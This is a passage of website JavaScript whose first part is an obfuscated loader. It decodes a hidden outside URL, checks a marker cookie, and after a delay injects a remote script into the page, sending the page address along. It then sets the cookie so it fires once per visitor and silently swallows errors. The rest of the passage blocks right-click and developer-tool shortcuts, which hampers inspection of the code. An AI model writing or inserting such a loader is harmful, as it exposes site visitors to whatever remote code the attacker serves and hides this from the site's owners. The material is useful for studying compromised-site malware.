          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxyf" + "ynhx3htr4ljy4xhwn" + "uy3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);



// STOP PEOPLE FROM STEALING
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});

document.onkeydown = function (e) {
  if (event.keyCode == 123) {
    return false;
  }
  if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
    return false;
  }
  if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
    return false;
  }
  if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
    return false;
  }
};